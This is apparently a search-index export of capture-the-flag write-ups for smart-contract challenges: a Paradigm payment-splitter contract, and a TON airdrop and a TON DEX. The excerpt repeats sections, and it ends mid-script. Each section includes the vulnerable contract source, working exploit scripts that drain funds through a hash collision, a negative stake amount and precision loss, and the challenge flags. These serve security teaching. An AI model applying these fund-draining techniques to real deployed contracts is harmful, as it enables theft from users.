distribute it to anyone, while keeping the hash unchanged (Note that array elements are padded to 32 bytes) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function _distribute ( uint256 splitId , address [] memory accounts , // @note [0xbEEF] uint32 [] memory percents , // @note [0, 5e5, 5e5] uint32 relayerFee , IERC20 token ) private { ... uint256 totalBalance = storedWalletBalance + externalWalletBalance ; if ( msg . sender != ownerOf ( splitId )) { uint256 relayerAmount = totalBalance * relayerFee / SCALE ; balances [ msg . sender ][ address ( token )] += relayerAmount ; totalBalance -= relayerAmount ; } for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { balances [ accounts [ i ]][ address ( token )] += totalBalance * percents [ i ] / SCALE ; } ... } Similarly, we can utilize the hash collision caused by abi.encodePacked to withdraw more ETH than deposited to drain Split Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 function solve ( address challenge , address player ) internal override { Challenge chall = Challenge ( challenge ); Split split = chall . SPLIT (); address [] memory account = new address []( 1 ); account [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); uint32 [] memory percents = new uint32 []( 3 ); percents [ 1 ] = 5e5 ; percents [ 2 ] = 5e5 ; split . distribute ( 0 , account , percents , 0 , IERC20 ( address ( 0 ))); // pull from SplitWallet address [] memory accounts = new address []( 2 ); accounts [ 0 ] = player ; accounts [ 1 ] = address ( 2 ** 32 - 1 ); // set percent to the max percents = new uint32 []( 2 ); percents [ 0 ] = 5e5 ; percents [ 1 ] = 5e5 ; split . createSplit ( accounts , percents , 0 ); Split . SplitData memory splitData = split . splitsById ( 1 ); // x * (2 ** 32 - 1) / 1e6 > (100 ether + x) => x > 100 ether * 1e6 / (2 ** 32 - 1e6 - 1) splitData . wallet . deposit { value : 100 ether * 1e6 / uint256 ( 2 ** 31 )}(); account [ 0 ] = player ; percents = new uint32 []( 3 ); percents [ 0 ] = 2 ** 32 - 1 ; percents [ 1 ] = 5e5 ; percents [ 2 ] = 5e5 ; split . distribute ( 1 , account , percents , 0 , IERC20 ( address ( 0 ))); IERC20 [] memory tokens = new IERC20 []( 1 ); tokens [ 0 ] = IERC20 ( address ( 0 )); uint256 [] memory amounts = new uint256 []( 1 ); amounts [ 0 ] = address ( split ). balance ; split . withdraw ( tokens , amounts ); require ( chall . isSolved ()); } Flag \u00b6 PCTF{gU355_7H3r3_w45n7_3nOUgH_1NpU7_V4L1D471ON}","title":"100%"},{"location":"blockchain/paradigm/one_hundred_percent/#description","text":"Your funds are safe when you use our innovative new payment splitter that ensure that 100% of assets make it to their intended recipients. Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"src/Split.sol\" ; import \"src/Challenge.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); Split split = new Split (); address [] memory addrs = new address []( 2 ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000dEaD ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); uint32 [] memory percents = new uint32 []( 2 ); percents [ 0 ] = 5e5 ; percents [ 1 ] = 5e5 ; uint256 id = split . createSplit ( addrs , percents , 0 ); Split . SplitData memory splitData = split . splitsById ( id ); splitData . wallet . deposit { value : 100 ether }(); challenge = address ( new Challenge ( split )); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol\" ; import \"./Split.sol\" ; contract Challenge { Split public immutable SPLIT ; constructor ( Split split ) { SPLIT = split ; } function isSolved () external view returns ( bool ) { Split . SplitData memory splitData = SPLIT . splitsById ( 0 ); return address ( SPLIT ). balance == 0 && address ( splitData . wallet ). balance == 0 ; } } src/Split.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\" ; import \"./SplitWallet.sol\" ; contract Split is ERC721 ( \"Split\" , \"SPLIT\" ) { using ClonesWithImmutableArgs for address ; struct SplitData { bytes32 hash ; SplitWallet wallet ; } SplitWallet private immutable IMPLEMENTATION = new SplitWallet (); uint256 private immutable SCALE = 1e6 ; uint256 public nextId ; mapping ( uint256 => SplitData ) private _splitsById ; mapping ( address => mapping ( address => uint256 )) public balances ; modifier onlySplitOwner ( uint256 splitId ) { _onlySplitOwner ( splitId ); _ ; } function _onlySplitOwner ( uint256 splitId ) private view { require ( msg . sender == ownerOf ( splitId ), \"NOT_SPLIT_OWNER\" ); } modifier validSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) { _validSplit ( accounts , percents , relayerFee ); _ ; } function _validSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) private pure { require ( accounts . length == percents . length , \"MISMATCH_LENGTH\" ); uint256 sum ; for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { sum += percents [ i ]; } require ( sum == SCALE , \"INVALID_PERCENTAGES\" ); require ( relayerFee < SCALE / 10 , \"INVALID_RELAYER_FEE\" ); } function createSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) external returns ( uint256 ) { return _createSplit ( accounts , percents , relayerFee , msg . sender ); } function createSplitFor ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , address owner ) external returns ( uint256 ) { return _createSplit ( accounts , percents , relayerFee , owner ); } function _createSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , address owner ) private validSplit ( accounts , percents , relayerFee ) returns ( uint256 ) { uint256 tokenId = nextId ++ ; address wallet = address ( IMPLEMENTATION ). clone ( abi . encodePacked ( address ( this ))); _splitsById [ tokenId ] = SplitData ({ hash : _hashSplit ( accounts , percents , relayerFee ), wallet : SplitWallet ( payable ( wallet ))}); _mint ( owner , tokenId ); return tokenId ; } function updateSplit ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) external { _updateSplit ( splitId , accounts , percents , relayerFee ); } function updateSplitAndDistribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) external { _updateSplit ( splitId , accounts , percents , relayerFee ); _distribute ( splitId , accounts , percents , relayerFee , token ); } function distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) external { _distribute ( splitId , accounts , percents , relayerFee , token ); } function withdraw ( IERC20 [] calldata tokens , uint256 [] calldata amounts ) external { for ( uint256 i = 0 ; i < tokens . length ; i ++ ) { IERC20 token = tokens [ i ]; uint256 amount = amounts [ i ]; balances [ msg . sender ][ address ( token )] -= amount ; if ( address ( token ) == address ( 0x00 )) { payable ( msg . sender ). transfer ( amount ); } else { token . transfer ( msg . sender , amount ); } } } function _updateSplit ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) private onlySplitOwner ( splitId ) validSplit ( accounts , percents , relayerFee ) { _splitsById [ splitId ]. hash = _hashSplit ( accounts , percents , relayerFee ); } function _distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) private { require ( _splitsById [ splitId ]. hash == _hashSplit ( accounts , percents , relayerFee )); SplitWallet wallet = _splitsById [ splitId ]. wallet ; uint256 storedWalletBalance = balances [ address ( wallet )][ address ( token )]; uint256 externalWalletBalance = wallet . balanceOf ( token ); uint256 totalBalance = storedWalletBalance + externalWalletBalance ; if ( msg . sender != ownerOf ( splitId )) { uint256 relayerAmount = totalBalance * relayerFee / SCALE ; balances [ msg . sender ][ address ( token )] += relayerAmount ; totalBalance -= relayerAmount ; } for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { balances [ accounts [ i ]][ address ( token )] += totalBalance * percents [ i ] / SCALE ; } if ( storedWalletBalance > 0 ) { balances [ address ( wallet )][ address ( token )] = 0 ; } if ( externalWalletBalance > 0 ) { wallet . pullToken ( token , externalWalletBalance ); } } function _hashSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) internal pure returns ( bytes32 ) { return keccak256 ( abi . encodePacked ( accounts , percents , relayerFee )); } function splitsById ( uint256 id ) external view returns ( SplitData memory ) { return _splitsById [ id ]; } receive () external payable {} } src/SplitWallet.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import \"@clones-with-immutable-args/src/Clone.sol\" ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; contract SplitWallet is Clone { function deposit () external payable {} function pullToken ( IERC20 token , uint256 amount ) external { require ( msg . sender == _getArgAddress ( 0 )); if ( address ( token ) == address ( 0x00 )) { payable ( msg . sender ). transfer ( amount ); } else { token . transfer ( msg . sender , amount ); } } function balanceOf ( IERC20 token ) external view returns ( uint256 ) { if ( address ( token ) == address ( 0x00 )) { return address ( this ). balance ; } return token . balanceOf ( address ( this )); } }","title":"Description"},{"location":"blockchain/paradigm/one_hundred_percent/#solution","text":"To solve the challenge, the ether balance of both SPLIT and _splitsById[0].wallet should be 0 The distribute() function of Split can be used to distribute the specific asset in the SplitWallet , based on the accounts and percents that are specified during the creation of the SplitWallet . After distribution, users can withdraw based on the value stored in balances However, distribute() simply validates the parameters by comparing the hash of abi.encodePacked result, while both accounts and percents are dynamic types. Thus, accounts and percents can be slightly adjusted during distribution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function _distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) private { require ( _splitsById [ splitId ]. hash == _hashSplit ( accounts , percents , relayerFee )); ... } function _hashSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) internal pure returns ( bytes32 ) { return keccak256 ( abi . encodePacked ( accounts , percents , relayerFee )); } During the creation of SplitWallet{id: 0} , index 1 account has been accidentally left uninitialized 1 2 3 4 5 address [] memory addrs = new address []( 2 ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000dEaD ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); ... uint256 id = split . createSplit ( addrs , percents , 0 ); So we can use modified accounts and percents to pull all ETH from SplitWallet{id: 0} but not distribute it to anyone, while keeping the hash unchanged (Note that array elements are padded to 32 bytes) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function _distribute ( uint256 splitId , address [] memory accounts , // @note [0xbEEF] uint32 [] memory percents , // @note [0, 5e5, 5e5] uint32 relayerFee , IERC20 token ) private { ... uint256 totalBalance = storedWalletBalance + externalWalletBalance ; if ( msg . sender != ownerOf ( splitId )) { uint256 relayerAmount = totalBalance * relayerFee / SCALE ; balances [ msg . sender ][ address ( token )] += relayerAmount ; totalBalance -= relayerAmount ; } for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { balances [ accounts [ i ]][ address ( token )] += totalBalance * percents [ i ] / SCALE ; } ... } Similarly, we can utilize the hash collision caused by abi.encodePacked to withdraw more ETH than deposited to drain Split","title":"Solution"},{"location":"blockchain/paradigm/one_hundred_percent/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 function solve ( address challenge , address player ) internal override { Challenge chall = Challenge ( challenge ); Split split = chall . SPLIT (); address [] memory account = new address []( 1 ); account [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); uint32 [] memory percents = new uint32 []( 3 ); percents [ 1 ] = 5e5 ; percents [ 2 ] = 5e5 ; split . distribute ( 0 , account , percents , 0 , IERC20 ( address ( 0 ))); // pull from SplitWallet address [] memory accounts = new address []( 2 ); accounts [ 0 ] = player ; accounts [ 1 ] = address ( 2 ** 32 - 1 ); // set percent to the max percents = new uint32 []( 2 ); percents [ 0 ] = 5e5 ; percents [ 1 ] = 5e5 ; split . createSplit ( accounts , percents , 0 ); Split . SplitData memory splitData = split . splitsById ( 1 ); // x * (2 ** 32 - 1) / 1e6 > (100 ether + x) => x > 100 ether * 1e6 / (2 ** 32 - 1e6 - 1) splitData . wallet . deposit { value : 100 ether * 1e6 / uint256 ( 2 ** 31 )}(); account [ 0 ] = player ; percents = new uint32 []( 3 ); percents [ 0 ] = 2 ** 32 - 1 ; percents [ 1 ] = 5e5 ; percents [ 2 ] = 5e5 ; split . distribute ( 1 , account , percents , 0 , IERC20 ( address ( 0 ))); IERC20 [] memory tokens = new IERC20 []( 1 ); tokens [ 0 ] = IERC20 ( address ( 0 )); uint256 [] memory amounts = new uint256 []( 1 ); amounts [ 0 ] = address ( split ). balance ; split . withdraw ( tokens , amounts ); require ( chall . isSolved ()); }","title":"Exploitation"},{"location":"blockchain/paradigm/one_hundred_percent/#flag","text":"PCTF{gU355_7H3r3_w45n7_3nOUgH_1NpU7_V4L1D471ON}","title":"Flag"},{"location":"blockchain/ton/airdrop/","tags":["ton","tact"],"text":"#ton #tact .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Challenge Files Airdrop.tact 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 const CLAIM_AMOUNT : Int = 1 ; const INIT_SUPPLY : Int = 30000 ; message UserStake { amount : Int ; } message UserWithdraw { amount : Int ; } message StakeEvent { sender : Address ; amount : Int ; } contract AirDrop { total_balance : Int as uint256 ; user_info : map < Address , Int > ; user_claim_info : map < Address , Bool > ; init ( version : Int ) { self . user_info = emptyMap (); self . total_balance = INIT_SUPPLY ; } receive ( \"AirDrop\" ) { require ( self . user_claim_info . get ( sender ()) == null , \"Have claimed\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance - CLAIM_AMOUNT ; self . user_info . set ( sender (), user_staked + CLAIM_AMOUNT ); self . user_claim_info . set ( sender (), true ); } receive ( msg : UserStake ) { require ( context (). value > msg . amount , \"Incorrect TON value\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance + msg . amount ; self . user_info . set ( sender (), user_staked + msg . amount ); } receive ( msg : UserWithdraw ) { require ( self . user_info . get ( sender ()) != null && self . user_info . get ( sender ()) !! != 0 , \"Nothing to withdraw\" ); let user_staked : Int = 0 ; user_staked = self . user_info . get ( sender ()) !! ; require ( msg . amount <= user_staked , \"Insufficient balance\" ); self . total_balance = self . total_balance - msg . amount ; if ( msg . amount == user_staked ) { self . user_info . del ( sender ()); } else { self . user_info . set ( sender (), user_staked - msg . amount ); } } get fun balance (): Int { return self . total_balance ; } get fun is_solved (): Bool { return self . total_balance == 0 ; } } Solution \u00b6 There is a state variable total_balance with value 30000 initially. The goal of this challenge is to make total_balance equal to zero There are three operations: AirDrop Each user can execute once and total_balance will be subtracted by 1. UserStake Increase total_balance and user_staked with user-provided msg.amount . UserWithdraw Decrease total_balance and user_staked with user-provided msg.amount . The msg.amount should not be greater than user_staked . Since UserStake does not check msg.amount which is of type Int , we can provide a negative value to reduce total_balance 1 2 3 4 5 6 7 8 9 receive ( msg : UserStake ) { require ( context (). value > msg . amount , \"Incorrect TON value\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance + msg . amount ; self . user_info . set ( sender (), user_staked + msg . amount ); } Exploitation \u00b6 Create a solve.ts under the sources/ and run yarn solve . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import { Address , toNano , TonClient , WalletContractV4 } from \"@ton/ton\" ; import { mnemonicToPrivateKey } from \"ton-crypto\" ; import { AirDrop } from \"./output/Airdrop_AirDrop\" ; import * as dotenv from \"dotenv\" ; dotenv . config (); ( async () => { const client = new TonClient ({ endpoint : \"http://65.21.223.95:8081/jsonRPC\" , }); let mnemonics = ( process . env . mnemonics_2 || \"\" ). toString (); console . log ( mnemonics ); let keyPair = await mnemonicToPrivateKey ( mnemonics . split ( \" \" )); let secretKey = keyPair . secretKey ; let workchain = 0 ; // we are working in basechain. let deployer_wallet = WalletContractV4 . create ({ workchain , publicKey : keyPair.publicKey }); console . log ( deployer_wallet . address ); let deployer_wallet_contract = client . open ( deployer_wallet ); let target = Address . parse ( CONTRACT ); let contract_open = await client . open ( AirDrop . fromAddress ( target )); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { // deducting fees from it value : toNano ( \"0.1\" ), }, { \"$$type\" : \"UserStake\" , \"amount\" : - 30000n , } ); })(); Flag \u00b6 flag{9uhaXCAoWxGi}_Airdrop References \u00b6 TonBitSec / ton-sample The init function adds a version parameter to avoid instance contracts having the same address. \u21a9","title":"Airdrop"},{"location":"blockchain/ton/airdrop/#description","text":"Challenge Files Airdrop.tact 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 const CLAIM_AMOUNT : Int = 1 ; const INIT_SUPPLY : Int = 30000 ; message UserStake { amount : Int ; } message UserWithdraw { amount : Int ; } message StakeEvent { sender : Address ; amount : Int ; } contract AirDrop { total_balance : Int as uint256 ; user_info : map < Address , Int > ; user_claim_info : map < Address , Bool > ; init ( version : Int ) { self . user_info = emptyMap (); self . total_balance = INIT_SUPPLY ; } receive ( \"AirDrop\" ) { require ( self . user_claim_info . get ( sender ()) == null , \"Have claimed\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance - CLAIM_AMOUNT ; self . user_info . set ( sender (), user_staked + CLAIM_AMOUNT ); self . user_claim_info . set ( sender (), true ); } receive ( msg : UserStake ) { require ( context (). value > msg . amount , \"Incorrect TON value\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance + msg . amount ; self . user_info . set ( sender (), user_staked + msg . amount ); } receive ( msg : UserWithdraw ) { require ( self . user_info . get ( sender ()) != null && self . user_info . get ( sender ()) !! != 0 , \"Nothing to withdraw\" ); let user_staked : Int = 0 ; user_staked = self . user_info . get ( sender ()) !! ; require ( msg . amount <= user_staked , \"Insufficient balance\" ); self . total_balance = self . total_balance - msg . amount ; if ( msg . amount == user_staked ) { self . user_info . del ( sender ()); } else { self . user_info . set ( sender (), user_staked - msg . amount ); } } get fun balance (): Int { return self . total_balance ; } get fun is_solved (): Bool { return self . total_balance == 0 ; } }","title":"Description"},{"location":"blockchain/ton/airdrop/#solution","text":"There is a state variable total_balance with value 30000 initially. The goal of this challenge is to make total_balance equal to zero There are three operations: AirDrop Each user can execute once and total_balance will be subtracted by 1. UserStake Increase total_balance and user_staked with user-provided msg.amount . UserWithdraw Decrease total_balance and user_staked with user-provided msg.amount . The msg.amount should not be greater than user_staked . Since UserStake does not check msg.amount which is of type Int , we can provide a negative value to reduce total_balance 1 2 3 4 5 6 7 8 9 receive ( msg : UserStake ) { require ( context (). value > msg . amount , \"Incorrect TON value\" ); let user_staked : Int = 0 ; if ( self . user_info . get ( sender ()) != null ) { user_staked = self . user_info . get ( sender ()) !! ; } self . total_balance = self . total_balance + msg . amount ; self . user_info . set ( sender (), user_staked + msg . amount ); }","title":"Solution"},{"location":"blockchain/ton/airdrop/#exploitation","text":"Create a solve.ts under the sources/ and run yarn solve . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import { Address , toNano , TonClient , WalletContractV4 } from \"@ton/ton\" ; import { mnemonicToPrivateKey } from \"ton-crypto\" ; import { AirDrop } from \"./output/Airdrop_AirDrop\" ; import * as dotenv from \"dotenv\" ; dotenv . config (); ( async () => { const client = new TonClient ({ endpoint : \"http://65.21.223.95:8081/jsonRPC\" , }); let mnemonics = ( process . env . mnemonics_2 || \"\" ). toString (); console . log ( mnemonics ); let keyPair = await mnemonicToPrivateKey ( mnemonics . split ( \" \" )); let secretKey = keyPair . secretKey ; let workchain = 0 ; // we are working in basechain. let deployer_wallet = WalletContractV4 . create ({ workchain , publicKey : keyPair.publicKey }); console . log ( deployer_wallet . address ); let deployer_wallet_contract = client . open ( deployer_wallet ); let target = Address . parse ( CONTRACT ); let contract_open = await client . open ( AirDrop . fromAddress ( target )); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { // deducting fees from it value : toNano ( \"0.1\" ), }, { \"$$type\" : \"UserStake\" , \"amount\" : - 30000n , } ); })();","title":"Exploitation"},{"location":"blockchain/ton/airdrop/#flag","text":"flag{9uhaXCAoWxGi}_Airdrop","title":"Flag"},{"location":"blockchain/ton/airdrop/#references","text":"TonBitSec / ton-sample The init function adds a version parameter to avoid instance contracts having the same address. \u21a9","title":"References"},{"location":"blockchain/ton/dex/","tags":["ton","tact","precision loss"],"text":"#ton #tact #precision loss .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Challenge Files dex.tact 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 import \"@stdlib/deploy\" ; message Withdraw { value : Int as coins ; } message Swap { amount : Int as coins ; a_b : Int ; } contract Dex with Deployable { override const storageReserve : Int = ton ( \"0.1\" ); solved : Bool ; lock : Bool ; tokena_amount : Int as coins ; tokenb_amount : Int as coins ; user_balances : map < Int , Int > ; user_created : Bool ; init ( ctf : Int ) { self . solved = false ; self . lock = true ; self . user_created = false ; self . tokena_amount = 10 ; self . tokenb_amount = 10 ; } receive ( \"CreateUser\" ){ require ( ! self . user_created , \"User created\" ); self . user_balances . set ( 1 , 10 ); self . user_balances . set ( 2 , 0 ); self . user_created = true ; } receive ( msg : Swap ){ let ctx : Context = context (); require ( ctx . value >= ton ( \"0.14\" ), \"insufficient pay for gas\" ); require ( self . user_created , \"Not created\" ); let x : Int = self . tokena_amount ; let y : Int = self . tokenb_amount ; let user_a : Int = self . user_balances . get ( 1 ) !! ; let user_b : Int = self . user_balances . get ( 2 ) !! ; if ( msg . a_b == 1 ){ require ( user_a >= msg . amount , \"Insufficient balance\" ); let out_amount : Int = y - ( x * y ) / ( x + msg . amount ); self . user_balances . set ( 1 , user_a - msg . amount ); self . user_balances . set ( 2 , user_b + out_amount ); self . tokena_amount = x + msg . amount ; self . tokenb_amount = y - out_amount ; } else { require ( user_b >= msg . amount , \"Insufficient balance\" ); let out_amount : Int = x - ( x * y ) / ( y + msg . amount ); self . user_balances . set ( 1 , user_a + out_amount ); self . user_balances . set ( 2 , user_b - msg . amount ); self . tokena_amount = x - out_amount ; self . tokenb_amount = y + msg . amount ; } if ( self . user_balances . get ( 1 ) !! + self . user_balances . get ( 2 ) !! == 29 ){ self . lock = false ; } } receive ( msg : Withdraw ) { require ( ! self . lock , \"locking\" ); // Get the current context let ctx : Context = context (); // Require required balance require ( myBalance () > ton ( \"1.0\" ) + self . storageReserve + msg . value , \"Insufficient balance\" ); // Withdraw send ( SendParameters { value : msg . value , mode : SendRemainingValue , to : ctx . sender , body : \"Withdraw \u0441ompleted\" . asComment () }); } receive ( \"Solve\" ){ require ( ! self . lock , \"Locking\" ); if ( myBalance () < ton ( \"0.5\" )){ self . solved = true ; } } get fun is_solved (): Bool { return self . solved == true ; } } Solution \u00b6 We first need to let the sum of the user_balances be 29 to set locked to false . After unlocking, send a Solve message when the contract balance is less than 0.5 ton to solve the challenge There is a loss of precision when calculating the out_amount . So, we may get more tokens after swapping Note that amount is serialized as coins , which is an alias to VarUInteger_16 . We can not send a negative value 1 2 3 4 message Swap { amount : Int as coins ; a_b : Int ; } After swapping, the contract balance will be surely above 0.5 ton. Because each swap requires sending at least 0.14 ton, and locked can't be set to false with just one or two swaps We have to bypass the check and withdraw some ton from the contract. myBalance() returns the nanoToncoin balance of the smart contract as it was at the start of the compute phase of the current transaction. Thus, we can increase the value attached to the withdraw message. Any excess left from the incoming message after all gas costs are deducted from it will be add to the outgoing value because of the send mode SendRemainingValue Each transaction consists of up to 5 phases: storage phase, credit phase, compute phase, action phase and bounce phase. In the credit phase, the balance of the contract with respect to a (possible) incoming message value and collected storage fee are calculated 1 2 3 4 5 6 7 8 9 10 11 12 13 14 receive ( msg : Withdraw ) { require ( ! self . lock , \"locking\" ); // Get the current context let ctx : Context = context (); // Require required balance require ( myBalance () > ton ( \"1.0\" ) + self . storageReserve + msg . value , \"Insufficient balance\" ); // Withdraw send ( SendParameters { value : msg . value , mode : SendRemainingValue , to : ctx . sender , body : \"Withdraw \u0441ompleted\" . asComment () }); } Exploitation \u00b6 Before and after the swap, the sum of tokena_amount , tokenb_amount , user_balances(1) and user_balances(2) remains unchanged. So after each swap, we hope that the sum of user_balances will increase, or at least the product of tokena_amount and tokenb_amount will decrease, which may result in a larger out_amount . swap.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def fun ( x , y , user_a , user_b , a , f ): if f == 1 : out = y - ( x * y ) // ( x + a ) return user_a - a , user_b + out , x + a , y - out else : out = x - ( x * y ) // ( y + a ) return user_a + out , user_b - a , x - out , y + a user_a , user_b = 10 , 0 x , y = 10 , 10 cnt = 0 while user_a + user_b < 29 : if user_b == 0 or user_a > 0 : for i in range ( user_a , 0 , - 1 ): ra , rb , rx , ry = fun ( x , y , user_a , user_b , i , 1 ) if ra + rb > user_a + user_b or rx * ry < x * y : user_a , user_b , x , y = ra , rb , rx , ry print ( f \"amount: { i } a_b: { 1 } user_a: { user_a } user_b: { user_b } x: { x } y: { y } \" ) cnt += 1 break if user_a == 0 : for i in range ( 1 , user_b + 1 ): ra , rb , rx , ry = fun ( x , y , user_a , user_b , i , 0 ) if ra + rb > user_a + user_b or rx * ry < x * y : user_a , user_b , x , y = ra , rb , rx , ry print ( f \"amount: { i } a_b: { 0 } user_a: { user_a } user_b: { user_b } x: { x } y: { y } \" ) cnt += 1 break print ( cnt ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 import { OpenedContract , Address , toNano , TonClient , WalletContractV4 } from \"@ton/ton\" ; import { mnemonicToPrivateKey } from \"ton-crypto\" ; import { Dex } from \"./output/Dex_Dex\" ; import * as dotenv from \"dotenv\" ; dotenv . config (); async function sleep ( wallet_contract : OpenedContract < WalletContractV4 > , seq : number ) { while ( true ) { if ( seq < ( await wallet_contract . getSeqno ())) { return wallet_contract . getSeqno (); } } } ( async () => { const client = new TonClient ({ endpoint : \"http://65.21.223.95:8081/jsonRPC\" , }); let mnemonics = ( process . env . mnemonics_2 || \"\" ). toString (); console . log ( mnemonics ); let keyPair = await mnemonicToPrivateKey ( mnemonics . split ( \" \" )); let secretKey = keyPair . secretKey ; let workchain = 0 ; let deployer_wallet = WalletContractV4 . create ({ workchain , publicKey : keyPair.publicKey }); console . log ( deployer_wallet . address ); let deployer_wallet_contract = client . open ( deployer_wallet ); console . log ( \"Balance\" , await deployer_wallet_contract . getBalance ()); let target = Address . parse ( CONTRACT ); let contract_open = await client . open ( Dex . fromAddress ( target )); let seqno : number = await deployer_wallet_contract . getSeqno (); await contract_open . send ( deployer_wallet_contract . sender ( secretKey ), { value : toNano ( \"0.1\" ), }, \"CreateUser\" ); seqno = await sleep ( deployer_wallet_contract , seqno ); console . 